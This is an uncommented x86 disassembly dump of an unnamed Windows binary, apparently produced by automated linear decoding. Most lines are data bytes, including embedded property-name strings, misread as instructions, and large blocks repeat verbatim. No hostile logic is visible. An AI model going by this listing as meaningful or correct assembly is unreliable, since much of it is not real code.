add [ eax + 0x7c0044aa ] ah
sahf
inc ecx
add [ eax - 0x63 ] cl
inc ecx
add [ esi + ebx * 4 - 0x607bffbf ] cl
inc ecx
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esp + ebx * 4 - 0x596bffbc ] dl
inc esp
add [ eax + edx * 2 - 0x4c63ffbc ] bl
inc esp
add [ eax ] ch
mov ah 0x44
add al ah
push ecx
inc esp
add [ edx ] cl
push esp
inc edi
insb
jns r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] eax
dec [ esi + ebx * 8 ]
outsb
add al 0x0
add [ eax ] al
outsb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
0x94ff0000 0x43d0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] al
and [ ebx ] 0x0
outsb
jae r-xdata
pop ds
add [ edi ] al
push ebx
jo r-xdata
push eax
fld [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add bh bh
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x30 ]
inc ebx
add [ eax ] bh
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ eax ] cl
push ebx
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
je r-xdata
push 0x40100073
add [ ecx ] bl
add bh bh
dec esp
inc eax
add [ eax - 0x3b ] cl
inc edx
add [ ebx ] cl
push esp
inc edi
insb
jns r-xdata
push 0x7473694c
nop
add al 0xc3
inc edx
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
mov esp 0xd800437e
add [ eax ] al
dec ebp
outsd
jne r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
or al 0xde
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3865646f
retn 0x44
jno r-xdata
push 0x68636143
enter 0x42c3 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x7473694c
mov al 0xc2
inc edx
add al ch
xchg ebp eax
inc ebx
add [ eax + eax ] cl
pop es
inc edx
jne r-xdata
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
outsb
je r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
xchg ebx eax
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
ror [ ebx - 0x2719173a ] cl
add [ eax ] eax
dec [ ebx - 0x31d7f2d ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x42c3 0x0
xor [ eax ] al
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ esi + eax * 8 + 0x540c0042 ] bl
inc edx
jne r-xdata
je r-xdata
adc [ eax ] al
push edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
push ss
outsb
std
outsb
inc edi
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
retn
outsb
jae r-xdata
mov eax esi
call sub_449d34
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
add [ eax - 0x3d ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3d ] dh
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_449ce0
add esp 0xfffffff0
call sub_40357c
sub_42be12
pop esp
fiadd [ edx ]
jl r-xdata
sbb [ eax - 0x4ff14ffa ] dh
adc dh [ eax - 0x4fec4fdc ]
adc al 0xb0
out dx eax
inc edx
add [ eax + 0x200042de ] dh
fild [ edx ]
mov eax 0xc00042df
fild [ edx ]
enter 0x42df 0x0
in al dx
fild [ edx ]
pushad
loopne r-xdata
xchg ecx eax
add [ eax - 0x1f ] bl
inc edx
add [ eax - 0x24 ] dh
inc edx
add [ esp + ebx * 8 + 0x42 ] bl
add [ edx + ebx * 8 + 0x42 ] ah
add [ edx + ebx * 8 - 0x24a3ffbe ] bh
inc edx
add [ esp + ebx * 8 + 0x42 ] dl
add [ esp + edx * 2 ] cl
push ebx
jo r-xdata
add bh bh
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
inc edx
jne r-xdata
add dh bh
inc esp
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ eax ] cl
add [ edi ] bl
outsb
jae r-xdata
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8865646f
insb
insb
push ebp
jo r-xdata
popad
add [ eax ] al
push [ edx + eax * 8 + 0x43 ]
je r-xdata
dec ecx
outsb
js r-xdata
add [ eax + eax ] dh
push esp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000f ] al
outsd
outsb
jae r-xdata
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ edx + 0x1 ] dh
add [ edx + ebp + 0x3c0041 ] bl
add dh bh
xchg esp eax
retn 0x43
add bh bh
dec eax
fiadd [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
jl r-xdata
outsb
nop
mov esi 0xc070042
push esp
push ebx
jo r-xdata
adc [ eax ] al
jo r-xdata
add [ fs : eax ] al
jb r-xdata
jge r-xdata
add [ ecx ] ah
add bh bh
je r-xdata
inc edx
jne r-xdata
call [ ebx * 8 + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
add al 0x44
outsd
ja r-xdata
add bh bh
adc al 0xdd
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ edi ] al
inc ebx
imul ebp [ esi + 0x74 ] 0x40103c73
add [ eax + 0x1 ] ch
add bh bh
mov al [ 0x10042dd ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edi + 0x72 ]
outsd
jne r-xdata
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
add [ eax ] dl
retn
inc ebx
add [ 0x6e410700 ] cl
je r-xdata
add [ eax + edx * 8 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040015 ] al
outsd
outsb
je r-xdata
popad
jo r-xdata
mov [ ebx + eax * 2 ] bh
and bh cl
inc ebx
add [ eax - 0x31 ] dl
inc ebx
add [ edi + ebp * 8 ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070012 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
test ch bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x46
insb
popad
je r-xdata
add [ eax ] eax
adc al 0x41
arpl [ eax + 0x6f ] bp
jb r-xdata
add eax [ eax ]
add [ eax ] al
or eax 0x6e410700
inc ebx
add [ edi ] ah
add [ edi ] al
inc edx
jne r-xdata
outsb
pushad
mov ebp 0x917c0042
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov edi 0xdc780041
inc edx
add [ esp + ebx * 8 + 0x10042 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ 0x70796c47 ] al
rol [ ebx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
push sub_42bbbc
jae r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
mov ch 0x41
add [ eax ] ch
add bh bh
adc al 0xd0
inc ebx
add [ edx - 0x6b010000 ] bl
rol [ ebx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jne r-xdata
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
push [ ebp + ebx * 8 + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
mov ah 0xdd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
jo r-xdata
outsb
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
outsb
je r-xdata
sbb eax [ eax ]
push cs
push eax
inc ebx
cmp al 0x10
inc eax
add [ ecx + eax ] bh
call eax
fld [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sbb [ eax ] al
push es
dec ebp
popad
jb r-xdata
add [ eax ] al
inc [ eax - 0x32 ]
inc ebx
add [ edi + ebp * 8 + 0x43 ] bl
add [ eax + 0x1 ] al
and [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xac656c62
adc eax 0x1200041
add bh bh
and [ ecx ] al
add bh bh
mov esp 0x43ef
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
push esp
jb r-xdata
adc [ eax ] al
jne r-xdata
push 0x6948776f
outsb
je r-xdata
popad
jb r-xdata
imul ebp [ esi + 0x18 ] 0x9c0042bc
fadd [ edx ]
test al 0xdc
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
or [ esi + 0x75 ] ecx
insd
inc edi
insb
jns r-xdata
inc edx
add [ eax + 0x4c000000 ] cl
xchg ebp eax
inc ebx
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
test al 0x34
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + eax * 8 ] ch
inc edx
add [ eax - 0x55 ] ah
inc esp
add al ch
scasb [ edi ]
inc esp
add [ eax + 0x7c0044aa ] ah
sahf
inc ecx
add [ eax - 0x63 ] cl
inc ecx
add [ esi + ebx * 4 - 0x607bffbf ] cl
inc ecx
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esp + ebx * 4 - 0x596bffbc ] dl
inc esp
add [ eax + edx * 2 - 0x4c63ffbc ] bl
inc esp
add [ eax ] ch
mov ah 0x44
add al ah
push ecx
inc esp
add [ edx ] cl
push esp
inc edi
insb
jns r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] eax
dec [ esi + ebx * 8 ]
outsb
add al 0x0
add [ eax ] al
outsb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
0x94ff0000 0x43d0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] al
and [ ebx ] 0x0
outsb
jae r-xdata
pop ds
add [ edi ] al
push ebx
jo r-xdata
push eax
fld [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add bh bh
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x30 ]
inc ebx
add [ eax ] bh
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ eax ] cl
push ebx
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
je r-xdata
push 0x40100073
add [ ecx ] bl
add bh bh
dec esp
inc eax
add [ eax - 0x3b ] cl
inc edx
add [ ebx ] cl
push esp
inc edi
insb
jns r-xdata
push 0x7473694c
nop
add al 0xc3
inc edx
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
mov esp 0xd800437e
add [ eax ] al
dec ebp
outsd
jne r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
or al 0xde
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3865646f
retn 0x44
jno r-xdata
push 0x68636143
enter 0x42c3 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x7473694c
mov al 0xc2
inc edx
add al ch
xchg ebp eax
inc ebx
add [ eax + eax ] cl
pop es
inc edx
jne r-xdata
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
outsb
je r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
xchg ebx eax
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
ror [ ebx - 0x2719173a ] cl
add [ eax ] eax
dec [ ebx - 0x31d7f2d ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x42c3 0x0
xor [ eax ] al
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ esi + eax * 8 + 0x540c0042 ] bl
inc edx
jne r-xdata
je r-xdata
adc [ eax ] al
push edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
push ss
outsb
std
outsb
inc edi
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
retn
outsb
jae r-xdata
mov eax esi
call sub_449d34
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
add [ eax - 0x3d ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3d ] dh
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_449ce0
add esp 0xfffffff0
call sub_40357c
sub_42be92
add [ eax ] eax
add [ eax ] al
add [ eax ] al
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8865646f
insb
insb
push ebp
jo r-xdata
dec ecx
outsb
js r-xdata
add [ eax + eax ] dh
push esp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000f ] al
outsd
outsb
jae r-xdata
add bh bh
dec eax
fiadd [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
jl r-xdata
adc [ eax ] al
jo r-xdata
add [ fs : eax ] al
jb r-xdata
jge r-xdata
add [ ecx ] ah
add bh bh
je r-xdata
call [ ebx * 8 + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
add al 0x44
outsd
ja r-xdata
add bh bh
adc al 0xdd
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ edi ] al
inc ebx
imul ebp [ esi + 0x74 ] 0x40103c73
add [ eax + 0x1 ] ch
add bh bh
mov al [ 0x10042dd ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edi + 0x72 ]
outsd
jne r-xdata
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ edx + 0x1 ] dh
inc ebx
add [ eax ] dl
retn
add [ eax + edx * 8 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040015 ] al
outsd
outsb
je r-xdata
popad
jo r-xdata
mov [ ebx + eax * 2 ] bh
and bh cl
inc ebx
add [ eax - 0x31 ] dl
inc ebx
add [ edi + ebp * 8 ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070012 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
test ch bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x46
insb
popad
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov edi 0xdc780041
inc edx
add [ esp + ebx * 8 + 0x10042 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ 0x70796c47 ] al
rol [ ebx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
push sub_42bbbc
jae r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
mov ch 0x41
add [ eax ] ch
add bh bh
adc al 0xd0
inc ebx
add [ edx - 0x6b010000 ] bl
rol [ ebx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jne r-xdata
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
push [ ebp + ebx * 8 + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
mov ah 0xdd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
jo r-xdata
outsb
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
outsb
je r-xdata
sbb eax [ eax ]
push cs
push eax
inc ebx
cmp al 0x10
inc eax
add [ ecx + eax ] bh
call eax
fld [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sbb [ eax ] al
push es
dec ebp
popad
jb r-xdata
add [ eax ] al
inc [ eax - 0x32 ]
inc ebx
add [ edi + ebp * 8 + 0x43 ] bl
add [ eax + 0x1 ] al
and [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xac656c62
adc eax 0x1200041
add bh bh
and [ ecx ] al
add bh bh
mov esp 0x43ef
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
push esp
jb r-xdata
adc [ eax ] al
jne r-xdata
push 0x6948776f
outsb
je r-xdata
popad
jb r-xdata
imul ebp [ esi + 0x18 ] 0x9c0042bc
fadd [ edx ]
test al 0xdc
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
or [ esi + 0x75 ] ecx
insd
inc edi
insb
jns r-xdata
inc edx
add [ eax + 0x4c000000 ] cl
xchg ebp eax
inc ebx
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
test al 0x34
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + eax * 8 ] ch
inc edx
add [ eax - 0x55 ] ah
inc esp
add al ch
scasb [ edi ]
inc esp
add [ eax + 0x7c0044aa ] ah
sahf
inc ecx
add [ eax - 0x63 ] cl
inc ecx
add [ esi + ebx * 4 - 0x607bffbf ] cl
inc ecx
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esp + ebx * 4 - 0x596bffbc ] dl
inc esp
add [ eax + edx * 2 - 0x4c63ffbc ] bl
inc esp
add [ eax ] ch
mov ah 0x44
add al ah
push ecx
inc esp
add [ edx ] cl
push esp
inc edi
insb
jns r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] eax
dec [ esi + ebx * 8 ]
outsb
add al 0x0
add [ eax ] al
outsb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
0x94ff0000 0x43d0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] al
and [ ebx ] 0x0
outsb
jae r-xdata
pop ds
add [ edi ] al
push ebx
jo r-xdata
push eax
fld [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add bh bh
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x30 ]
inc ebx
add [ eax ] bh
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ eax ] cl
push ebx
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
je r-xdata
push 0x40100073
add [ ecx ] bl
add bh bh
dec esp
inc eax
add [ eax - 0x3b ] cl
inc edx
add [ ebx ] cl
push esp
inc edi
insb
jns r-xdata
push 0x7473694c
nop
add al 0xc3
inc edx
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
mov esp 0xd800437e
add [ eax ] al
dec ebp
outsd
jne r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
or al 0xde
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3865646f
retn 0x44
jno r-xdata
push 0x68636143
enter 0x42c3 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x7473694c
mov al 0xc2
inc edx
add al ch
xchg ebp eax
inc ebx
add [ eax + eax ] cl
pop es
inc edx
jne r-xdata
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
outsb
je r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
xchg ebx eax
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
ror [ ebx - 0x2719173a ] cl
add [ eax ] eax
dec [ ebx - 0x31d7f2d ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x42c3 0x0
xor [ eax ] al
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ esi + eax * 8 + 0x540c0042 ] bl
inc edx
jne r-xdata
je r-xdata
adc [ eax ] al
push edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
push ss
outsb
std
outsb
inc edi
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
retn
outsb
jae r-xdata
mov eax esi
call sub_449d34
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
add [ eax - 0x3d ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3d ] dh
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_449ce0
add esp 0xfffffff0
call sub_40357c
sub_42c0dc
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
push eax
popad
jb r-xdata
add al 0x0
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
or al 0xde
